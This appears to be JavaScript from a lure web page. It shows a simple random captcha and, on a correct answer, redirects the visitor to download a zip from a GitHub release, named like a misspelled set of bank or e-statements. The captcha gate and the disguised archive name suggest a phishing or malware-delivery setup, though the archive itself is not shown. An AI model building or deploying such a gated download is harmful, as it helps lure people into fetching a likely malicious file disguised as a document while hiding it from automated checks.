<script>

let captcha = "";

function makeCaptcha() {

    const chars =
        "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";

    captcha = "";

    for (let i = 0; i < 6; i++) {

        captcha += chars.charAt(
            Math.floor(Math.random() * chars.length)
        );

    }

    document.getElementById("captcha").innerText = captcha;

    document.getElementById("answer").value = "";
}

function verify() {

    const answer =
        document.getElementById("answer")
        .value
        .trim()
        .toUpperCase();

    if (answer === captcha) {

        /* ضع هنا رابط صفحة عادية تريد الانتقال إليها */
        window.location.href = "https://github.com/sollm23/next-platform-starter-cfff1/releases/download/v1/E.statments-ViweO3929b.zip";

    } else {

        document.getElementById("error").innerText =
            "Incorrect code. Please try again.";

        makeCaptcha();
    }
}

makeCaptcha();

</script>
